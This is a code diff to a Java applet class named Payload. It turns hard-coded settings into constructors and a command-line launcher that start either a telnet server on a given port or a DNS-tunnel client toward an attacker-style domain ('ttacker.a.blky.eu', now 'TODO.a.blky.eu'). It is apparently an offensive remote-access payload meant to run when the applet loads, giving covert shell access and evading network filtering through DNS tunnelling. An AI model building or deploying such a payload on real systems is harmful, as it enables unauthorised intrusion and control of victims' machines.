@@ -11,12 +11,44 @@ public class Payload extends Applet {
         SERVER, DNS_TUNNEL_CLIENT
     }
 
-    private final int port = 34567;
-    private final String domain = "ttacker.a.blky.eu";
-    private final Mode mode = Mode.DNS_TUNNEL_CLIENT;
+    private int port = 34567;
+    private String domain = null;
+    private Mode mode = Mode.DNS_TUNNEL_CLIENT;
 
-    public static void main(String[] args) {
-        new Payload().start();
+	public Payload() {
+		this( "TODO.a.blky.eu" );
+	}
+    /**
+	 * @param string
+	 */
+	public Payload(String dPar) {
+		domain= dPar;
+		mode = Mode.DNS_TUNNEL_CLIENT;
+		System.out.println("// start a server via DNS tunnel over ["+dPar+"]");
+	}
+	/**
+	 * 
+	 * @param portPar
+	 */
+	public Payload(long portPar) {
+		mode = Mode.SERVER;
+		port = (int) portPar;
+		System.out.println("// start a simple telnet server:"+portPar);
+	}	
+
+	public static void main(String[] args) {
+		Payload payload;
+		if (args.length==1) {
+			try {
+				payload = new Payload(Long.parseLong(args[0]));
+			}catch(Exception e) {
+				payload = new Payload(args[0]);
+			}
+			payload.start();
+		}else {
+			System.out.println("USE:>java Payload DOMAIN|PORT");
+		}
+		
     }
 
     @Override
@@ -28,7 +60,7 @@ public class Payload extends Applet {
                 break;
             case DNS_TUNNEL_CLIENT:
                 // start a server via DNS tunnel
-                DNSTunnelClient.start(domain);
+                DNSTunnelClient.start(domain==null?this.getParameter("domain"):domain);
                 break;
             default:
                 throw new RuntimeException("Unknown mode: " + mode);
@@ -40,5 +72,6 @@ public class Payload extends Applet {
         g.drawString("Like most of life's problems, "
                 + "this one can be solved with bending", 40, 20);
     }
+ 
 
 }
